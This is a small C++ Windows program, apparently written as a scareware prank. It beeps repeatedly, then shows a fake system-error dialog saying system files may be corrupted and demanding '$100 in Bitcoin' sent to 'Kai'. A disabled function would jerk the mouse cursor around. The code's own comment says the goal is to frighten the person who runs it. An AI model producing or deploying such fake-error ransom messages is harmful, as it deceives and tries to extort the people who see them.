#include <windows.h>
#include <mmsystem.h>
#include <tchar.h>
#include <stdlib.h>
#include <iostream>


void FakeWarn()
{
     // Leave a message to scare the crap out of them
     auto body = L"A critical error has occurred. Your system files "
                  "may be corrupted. Windows is trying to fix the issue. To fix this, send Kai $100 in Bitcoin";
     MessageBox(NULL, body, 
                L"Warning", MB_OK | MB_ICONWARNING);
   
}
void MoveMouse()
{
     // Make the mouse cursor crazy
     int X = rand()%1367;
     int Y = rand()%769;
     ::SetCursorPos(X, Y);
}

void Beeper()
{
     // Make different beep sound with different frequences and durations
     int Freq = rand()%1000 + 1000;
     int Dur =  rand()%500 + 100;
     std::cout << "Freq:" << Freq << " Duration:" << Dur << std::endl;
     ::Beep(Freq, Dur);
}

int _tmain( int argc,  _TCHAR* argv[] ){
    for(int j = 0; j<20;j++){
        //MoveMouse();
        Beeper();
    }
    FakeWarn();
    for(int i=0; i<1; i++){
    ::PlaySound(TEXT("SystemStart"), NULL, SND_ALIAS);
    return 0;
    }
}